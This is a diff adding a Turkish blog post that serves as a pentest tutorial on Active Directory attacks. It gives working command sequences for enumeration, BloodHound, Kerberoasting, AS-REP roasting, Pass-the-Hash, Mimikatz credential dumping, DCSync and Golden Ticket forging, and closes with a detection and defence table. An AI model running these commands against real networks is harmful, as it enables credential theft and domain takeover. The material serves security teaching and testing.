@@ -1,0 +1,191 @@
+---
+title: "Active Directory Saldırı Teknikleri"
+date: "2026-03-10"
+description: "Kurumsal ağların omurgası olan Active Directory'ye yönelik Kerberoasting, Pass-the-Hash, BloodHound ile yol analizi ve DCSync saldırılarını ele aldım."
+tags: ["Active Directory", "Pentest"]
+---
+
+## Neden Active Directory?
+
+Kurumsal ağların büyük çoğunluğu kimlik doğrulama ve yetkilendirme için Windows Active Directory kullanır. Bir domain kullanıcısı ele geçirildikten sonra AD zafiyetleri sömürülerek **Domain Admin** yetkisine ulaşmak mümkündür. Bu yüzden AD saldırıları her pentest metodolojisinin merkezindedir.
+
+> "Own the AD, own the network."
+
+## Ortam Keşfi
+
+### Domain Bilgisi Toplama
+
+```powershell
+# Domain bilgisi
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# Domain Controller'ları bul
+nltest /dclist:DOMAIN
+
+# Tüm kullanıcılar
+net user /domain
+
+# Gruplar
+net group /domain
+net group "Domain Admins" /domain
+
+# Bilgisayarlar
+net view /domain
+```
+
+```bash
+# Linux'tan — impacket
+python3 GetADUsers.py -all DOMAIN/user:pass -dc-ip 10.10.10.1
+python3 GetUserSPNs.py DOMAIN/user:pass -dc-ip 10.10.10.1
+```
+
+## BloodHound ile Yol Analizi
+
+BloodHound, AD ilişkilerini görselleştirerek Domain Admin'e giden en kısa yolu bulur.
+
+```bash
+# SharpHound ile veri topla (hedef Windows makine)
+.\SharpHound.exe -c All --zipfilename loot.zip
+
+# Linux'tan — bloodhound-python
+pip install bloodhound
+bloodhound-python -u user -p pass -d DOMAIN.LOCAL \
+  -dc 10.10.10.1 -c All --zip
+```
+
+```bash
+# Neo4j ve BloodHound başlat
+sudo neo4j start
+bloodhound &
+
+# Panel: http://localhost:7474
+# Credentials: neo4j / neo4j (ilk girişte değiştirin)
+```
+
+BloodHound'da işe yarar sorgular:
+
+```
+Shortest Paths to Domain Admins
+Find Principals with DCSync Rights
+Users with Most Local Admin Rights
+Kerberoastable Users
+```
+
+## Kerberoasting
+
+Service Principal Name (SPN) tanımlı hesaplar için Kerberos servis bileti talep edilir, bu bilet offline kırılabilir.
+
+```bash
+# impacket ile — ağdan direkt
+python3 GetUserSPNs.py DOMAIN/user:pass \
+  -dc-ip 10.10.10.1 -request -outputfile hashes.txt
+
+# Hedef Windows makineden — Rubeus
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+```
+
+Hash'i kır:
+
+```bash
+# Hashcat
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# John
+john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+## AS-REP Roasting
+
+Pre-authentication devre dışı olan kullanıcılar için şifre gerektirmeden hash alınabilir.
+
+```bash
+# Kullanıcı adları biliniyor
+python3 GetNPUsers.py DOMAIN/ -usersfile users.txt \
+  -dc-ip 10.10.10.1 -format hashcat -outputfile asrep.txt
+
+# Hash kır
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+```
+
+## Pass-the-Hash (PtH)
+
+NTLM hash ele geçirildikten sonra şifreyi kırmaya gerek kalmadan kimlik doğrulaması yapılabilir.
+
+```bash
+# impacket — psexec ile shell
+python3 psexec.py -hashes :NTLM_HASH DOMAIN/Administrator@10.10.10.1
+
+# wmiexec
+python3 wmiexec.py -hashes :NTLM_HASH DOMAIN/user@10.10.10.1
+
+# smbexec
+python3 smbexec.py -hashes :NTLM_HASH DOMAIN/user@10.10.10.1
+
+# CrackMapExec ile ağ genelinde test
+crackmapexec smb 10.10.10.0/24 -u Administrator -H NTLM_HASH
+```
+
+## Credential Dumping
+
+```bash
+# Mimikatz — LSASS'tan hash dump (hedef Windows)
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+mimikatz # lsadump::sam
+
+# Secretsdump — uzaktan
+python3 secretsdump.py DOMAIN/user:pass@10.10.10.1
+python3 secretsdump.py -hashes :NTLM_HASH DOMAIN/user@10.10.10.1
+
+# NTDS.dit dump (DC'de)
+python3 secretsdump.py -ntds /path/ntds.dit -system /path/SYSTEM LOCAL
+```
+
+## DCSync Saldırısı
+
+Domain Admin yetkisi varsa veya GetChangesAll hakkı varsa tüm domain hash'leri çekilebilir.
+
+```bash
+# Mimikatz
+mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
+
+# impacket
+python3 secretsdump.py DOMAIN/user:pass@DC_IP -just-dc-user Administrator
+python3 secretsdump.py DOMAIN/user:pass@DC_IP -just-dc  # tüm hesaplar
+```
+
+## Golden Ticket
+
+`krbtgt` hash'i ele geçirildikten sonra herhangi bir kullanıcı adına sahte Kerberos bileti üretilebilir.
+
+```bash
+# Mimikatz — krbtgt hash'i al
+mimikatz # lsadump::dcsync /user:krbtgt
+
+# Golden ticket oluştur
+mimikatz # kerberos::golden \
+  /user:Administrator \
+  /domain:DOMAIN.LOCAL \
+  /sid:S-1-5-21-XXXXX \
+  /krbtgt:KRBTGT_NTLM_HASH \
+  /ticket:golden.kirbi
+
+# Bileti yükle
+mimikatz # kerberos::ptt golden.kirbi
+
+# Doğrula
+klist
+dir \\DC01\C$
+```
+
+## Savunma Perspektifi
+
+| Saldırı | Tespit Yöntemi | Savunma |
+|---|---|---|
+| Kerberoasting | Event ID 4769 (TGS istekleri) | Güçlü servis hesabı parolaları |
+| AS-REP Roasting | Event ID 4768 (pre-auth yok) | Pre-authentication zorunlu kıl |
+| Pass-the-Hash | Event ID 4624 (logon type 3) | Protected Users grubu |
+| DCSync | Event ID 4662 (replication) | DCSync haklarını denetle |
+| Golden Ticket | Event ID 4769 + anormal bilet ömrü | krbtgt parolasını düzenli sıfırla |
+
+Bir sonraki yazıda **Lateral Movement** ve pivot teknikleri ile ağ içinde yayılmayı ele alacağım.
